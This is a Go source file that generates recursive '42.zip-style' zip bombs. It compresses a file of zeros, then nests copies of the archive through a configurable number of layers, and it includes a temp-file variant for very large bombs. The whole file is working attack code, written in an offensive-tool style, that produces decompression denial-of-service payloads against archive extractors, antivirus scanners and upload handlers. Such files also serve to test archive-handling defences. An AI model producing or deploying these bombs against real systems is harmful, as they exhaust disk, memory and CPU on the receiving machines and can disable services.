package generator

import (
	"archive/zip"
	"bytes"
	"compress/flate"
	"fmt"
	"io"
	"os"
	"path/filepath"
)

// GenerateRecursive creates a recursive zip bomb (42.zip style)
// Structure: Each layer contains N zip files, each containing N zip files...
// Final layer contains files filled with zeros
func GenerateRecursive(config BombConfig) error {
	fmt.Printf("[*] Creating recursive bomb: %d layers, %d files per layer\n",
		config.Layers, config.FilesPerLayer)
	fmt.Printf("[*] Base file size: %d bytes\n", config.BaseSize)

	// Start from the innermost layer and work outward
	// Layer 0: Create the base file (zeros)
	currentLayerData, err := createBaseLayer(config.BaseSize)
	if err != nil {
		return fmt.Errorf("failed to create base layer: %w", err)
	}
	fmt.Printf("[+] Layer 0 (base): Created compressed zero file (%d bytes compressed)\n",
		len(currentLayerData))

	// Build layers from inside out
	for layer := 1; layer <= config.Layers; layer++ {
		layerData, err := createRecursiveLayer(currentLayerData, config.FilesPerLayer, layer)
		if err != nil {
			return fmt.Errorf("failed to create layer %d: %w", layer, err)
		}
		fmt.Printf("[+] Layer %d: Created zip with %d entries (%d bytes)\n",
			layer, config.FilesPerLayer, len(layerData))
		currentLayerData = layerData
	}

	// Write final output
	return os.WriteFile(config.OutputFile, currentLayerData, 0644)
}

// createBaseLayer creates the innermost layer: a zip containing a file of zeros
func createBaseLayer(size int64) ([]byte, error) {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)

	// Set maximum compression
	zw.RegisterCompressor(zip.Deflate, func(out io.Writer) (io.WriteCloser, error) {
		return flate.NewWriter(out, flate.BestCompression)
	})

	// Create a file filled with zeros
	header := &zip.FileHeader{
		Name:   "0",
		Method: zip.Deflate,
	}

	writer, err := zw.CreateHeader(header)
	if err != nil {
		return nil, err
	}

	// Write zeros in chunks to avoid memory issues
	zeroChunk := make([]byte, 1024*1024) // 1MB chunks of zeros
	remaining := size

	for remaining > 0 {
		toWrite := int64(len(zeroChunk))
		if remaining < toWrite {
			toWrite = remaining
		}
		_, err := writer.Write(zeroChunk[:toWrite])
		if err != nil {
			return nil, err
		}
		remaining -= toWrite
	}

	if err := zw.Close(); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

// createRecursiveLayer creates a zip containing N copies of the inner data
func createRecursiveLayer(innerData []byte, count int, layerNum int) ([]byte, error) {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)

	// Set maximum compression
	zw.RegisterCompressor(zip.Deflate, func(out io.Writer) (io.WriteCloser, error) {
		return flate.NewWriter(out, flate.BestCompression)
	})

	for i := 0; i < count; i++ {
		header := &zip.FileHeader{
			Name:   fmt.Sprintf("%d.zip", i),
			Method: zip.Deflate,
		}

		writer, err := zw.CreateHeader(header)
		if err != nil {
			return nil, err
		}

		_, err = writer.Write(innerData)
		if err != nil {
			return nil, err
		}
	}

	if err := zw.Close(); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

// GenerateRecursiveWithTemp creates recursive bomb using temp files (for very large bombs)
// This is more memory efficient for extreme cases
func GenerateRecursiveWithTemp(config BombConfig) error {
	tempDir, err := os.MkdirTemp("", "bomber-")
	if err != nil {
		return fmt.Errorf("failed to create temp directory: %w", err)
	}
	defer os.RemoveAll(tempDir)

	fmt.Printf("[*] Using temp directory: %s\n", tempDir)

	// Create base layer file
	baseFile := filepath.Join(tempDir, "layer_0.zip")
	baseData, err := createBaseLayer(config.BaseSize)
	if err != nil {
		return fmt.Errorf("failed to create base layer: %w", err)
	}

	if err := os.WriteFile(baseFile, baseData, 0644); err != nil {
		return fmt.Errorf("failed to write base layer: %w", err)
	}
	fmt.Printf("[+] Layer 0: %s (%d bytes)\n", baseFile, len(baseData))

	currentFile := baseFile

	// Build each layer
	for layer := 1; layer <= config.Layers; layer++ {
		nextFile := filepath.Join(tempDir, fmt.Sprintf("layer_%d.zip", layer))

		// Read current layer
		data, err := os.ReadFile(currentFile)
		if err != nil {
			return fmt.Errorf("failed to read layer %d: %w", layer-1, err)
		}

		// Create next layer
		nextData, err := createRecursiveLayer(data, config.FilesPerLayer, layer)
		if err != nil {
			return fmt.Errorf("failed to create layer %d: %w", layer, err)
		}

		if err := os.WriteFile(nextFile, nextData, 0644); err != nil {
			return fmt.Errorf("failed to write layer %d: %w", layer, err)
		}

		fmt.Printf("[+] Layer %d: %s (%d bytes)\n", layer, nextFile, len(nextData))

		// Remove previous layer to save space
		os.Remove(currentFile)
		currentFile = nextFile
	}

	// Copy final result to output
	finalData, err := os.ReadFile(currentFile)
	if err != nil {
		return fmt.Errorf("failed to read final layer: %w", err)
	}

	return os.WriteFile(config.OutputFile, finalData, 0644)
}
